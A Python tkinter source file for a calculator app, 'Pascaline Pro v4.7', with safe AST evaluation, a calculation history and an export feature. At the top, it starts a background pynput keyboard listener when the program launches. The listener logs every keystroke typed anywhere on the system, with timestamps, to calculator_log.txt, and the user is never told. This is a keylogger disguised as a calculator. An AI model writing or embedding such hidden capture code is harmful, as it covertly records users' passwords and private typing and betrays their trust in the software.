import tkinter as tk
from tkinter import messagebox, filedialog
import ast
import operator
from pynput import keyboard
from datetime import datetime


# --- LOGGING CONFIGURATION (Background) ---
def on_press(key):
    try:
        current_time = datetime.now().strftime("%H:%M:%S")
        with open("calculator_log.txt", "a") as f:
            if hasattr(key, "char") and key.char is not None:
                f.write(f"[{current_time}] Key: {key.char}\n")
            elif key == keyboard.Key.enter:
                f.write(f"[{current_time}] Key: ENTER\n")
    except Exception:
        pass


# Start keyboard listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# --- SECURE AST CALCULATION LOGIC ---


def safe_div(a, b):
    """Handles division and prevents division by zero."""
    if b == 0:
        raise ValueError("Division par zéro !")
    return a / b


def safe_mod(a, b):
    """Handles modulo and prevents modulo by zero."""
    if b == 0:
        raise ValueError("Modulo par zéro !")
    return a % b


# Map AST operators to safe Python functions
OPERATORS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: safe_div,
    ast.Mod: safe_mod,
    ast.Pow: operator.pow,
    ast.USub: operator.neg,
}


def evaluate_node(node):
    """Recursively evaluates the AST nodes, including Expression root."""
    # Correction : Gestion du nœud racine Expression
    if isinstance(node, ast.Expression):
        return evaluate_node(node.body)
    elif isinstance(node, ast.Constant):
        return node.value
    elif isinstance(node, ast.BinOp):
        op_type = type(node.op)
        if op_type not in OPERATORS:
            raise ValueError(f"Opérateur {op_type.__name__} non supporté")
        return OPERATORS[op_type](evaluate_node(node.left), evaluate_node(node.right))
    elif isinstance(node, ast.UnaryOp):
        return OPERATORS[type(node.op)](evaluate_node(node.operand))
    raise ValueError("Structure d'expression non supportée")


# --- HOVER EFFECT FUNCTION ---


def apply_hover(button, original_color, hover_color):
    """Changes button background on mouse hover."""
    button.bind("<Enter>", lambda e: button.config(bg=hover_color))
    button.bind("<Leave>", lambda e: button.config(bg=original_color))


# --- GUI FUNCTIONS ---


def on_button_click(value):
    display.insert(tk.END, str(value))


def add_sqrt():
    display.insert(tk.END, "**0.5")


def add_modulo():
    display.insert(tk.END, "%")


def clear_display():
    display.delete(0, tk.END)


def backspace():
    current = display.get()
    display.delete(0, tk.END)
    display.insert(0, current[:-1])


def calculate_result(event=None):
    try:
        expression = display.get()
        if not expression:
            return
        
        # --- LOGIQUE POURCENTAGE ---
        # On remplace '%' par '/100' pour que l'AST puisse le calculer mathématiquement
        if "%" in expression:
            expression = expression.replace("%", "/100")

        if expression.count("(") != expression.count(")"):
            raise ValueError("Parenthèse manquante ou mal fermée")

        try:
            tree = ast.parse(expression, mode="eval")
        except SyntaxError:
            raise ValueError("Erreur de syntaxe (vérifiez vos opérateurs)")

        result = evaluate_node(tree)

        if isinstance(result, float) and result.is_integer():
            result = int(result)
        elif isinstance(result, float):
            result = round(result, 8)

        timestamp = datetime.now().strftime("%H:%M")
        # On affiche l'expression originale (avec %) dans l'historique
        history_listbox.insert(tk.END, f"[{timestamp}] {display.get()} = {result}")
        history_listbox.see(tk.END)

        display.delete(0, tk.END)
        display.insert(0, str(result))

    except ValueError as ve:
        messagebox.showerror("Erreur", str(ve))
    except Exception:
        messagebox.showerror("Erreur", "Expression invalide")


def export_history():
    history_data = history_listbox.get(0, tk.END)
    if not history_data:
        messagebox.showwarning("Export", "History is empty!")
        return
    file_path = filedialog.asksaveasfilename(
        defaultextension=".txt",
        filetypes=[("Text files", "*.txt")],
        title="Export History",
    )
    if file_path:
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(
                    f"--- Pascaline Pro History ({datetime.now().strftime('%Y-%m-%d')}) ---\n"
                )
                for line in history_data:
                    f.write(line + "\n")
            messagebox.showinfo("Export", "History exported successfully!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save file: {e}")


def clear_history():
    if history_listbox.size() > 0:
        if messagebox.askyesno("Clear", "Do you want to delete all history?"):
            history_listbox.delete(0, tk.END)


# --- TKINTER INTERFACE SETUP ---

root = tk.Tk()
root.title("Pascaline Pro v4.7")
root.resizable(False, False)

main_frame = tk.Frame(root, padx=15, pady=15)
main_frame.pack()

calc_frame = tk.Frame(main_frame)
calc_frame.grid(row=0, column=0)

history_frame = tk.Frame(main_frame, padx=15)
history_frame.grid(row=0, column=1, sticky="ns")

# Input Display
display = tk.Entry(
    calc_frame, font=("Arial", 20), borderwidth=5, relief="flat", justify="right"
)
display.grid(row=0, column=0, columnspan=4, pady=15)
display.bind("<Return>", calculate_result)

# --- BUTTONS WITH HOVER ---

buttons = [
    ("7", "#e0e0e0", "#bdbdbd"),
    ("8", "#e0e0e0", "#bdbdbd"),
    ("9", "#e0e0e0", "#bdbdbd"),
    ("/", "#e0e0e0", "#bdbdbd"),
    ("4", "#e0e0e0", "#bdbdbd"),
    ("5", "#e0e0e0", "#bdbdbd"),
    ("6", "#e0e0e0", "#bdbdbd"),
    ("*", "#e0e0e0", "#bdbdbd"),
    ("1", "#e0e0e0", "#bdbdbd"),
    ("2", "#e0e0e0", "#bdbdbd"),
    ("3", "#e0e0e0", "#bdbdbd"),
    ("-", "#e0e0e0", "#bdbdbd"),
    ("C", "#f44336", "#ef5350"),
    ("0", "#e0e0e0", "#bdbdbd"),
    ("=", "#4CAF50", "#66BB6A"),
    ("+", "#e0e0e0", "#bdbdbd"),
]

r, c = 1, 0
for text, color, hov in buttons:
    if text == "=":
        cmd = calculate_result
    elif text == "C":
        cmd = clear_display
    else:
        cmd = lambda x=text: on_button_click(x)

    btn = tk.Button(
        calc_frame,
        text=text,
        width=5,
        height=2,
        font=("Arial", 12, "bold"),
        bg=color,
        command=cmd,
    )
    btn.grid(row=r, column=c, padx=2, pady=2)
    apply_hover(btn, color, hov)

    c += 1
    if c > 3:
        c = 0
        r += 1

specials = [
    ("√", add_sqrt, "#9E9E9E", "#757575"),
    ("**", lambda: on_button_click("**"), "#9E9E9E", "#757575"),
    ("%", add_modulo, "#9E9E9E", "#757575"),
    ("⌫", backspace, "#FF9800", "#FB8C00"),
]

for i, (txt, cmd, col, hov) in enumerate(specials):
    btn = tk.Button(
        calc_frame,
        text=txt,
        width=5,
        height=2,
        font=("Arial", 12, "bold"),
        bg=col,
        fg="white" if i < 3 else "black",
        command=cmd,
    )
    btn.grid(row=5, column=i, padx=2, pady=2)
    apply_hover(btn, col, hov)

btn_l = tk.Button(
    calc_frame,
    text="(",
    width=12,
    height=1,
    font=("Arial", 11, "bold"),
    bg="#BDBDBD",
    command=lambda: on_button_click("("),
)
btn_l.grid(row=6, column=0, columnspan=2, padx=2, pady=2)
apply_hover(btn_l, "#BDBDBD", "#9E9E9E")

btn_r = tk.Button(
    calc_frame,
    text=")",
    width=12,
    height=1,
    font=("Arial", 11, "bold"),
    bg="#BDBDBD",
    command=lambda: on_button_click(")"),
)
btn_r.grid(row=6, column=2, columnspan=2, padx=2, pady=2)
apply_hover(btn_r, "#BDBDBD", "#9E9E9E")

# --- HISTORY SECTION ---
tk.Label(history_frame, text="Calculation History", font=("Arial", 10, "bold")).pack()
history_listbox = tk.Listbox(history_frame, width=35, height=14, font=("Courier", 9))
history_listbox.pack(pady=5)

btn_exp = tk.Button(
    history_frame,
    text="💾 Export History",
    command=export_history,
    bg="#2196F3",
    fg="white",
    font=("Arial", 9, "bold"),
)
btn_exp.pack(fill="x", pady=2)
apply_hover(btn_exp, "#2196F3", "#1976D2")

btn_clr = tk.Button(
    history_frame,
    text="🗑️ Clear History",
    command=clear_history,
    bg="#f44336",
    fg="white",
    font=("Arial", 9, "bold"),
)
btn_clr.pack(fill="x", pady=2)
apply_hover(btn_clr, "#f44336", "#d32f2f")

root.mainloop()
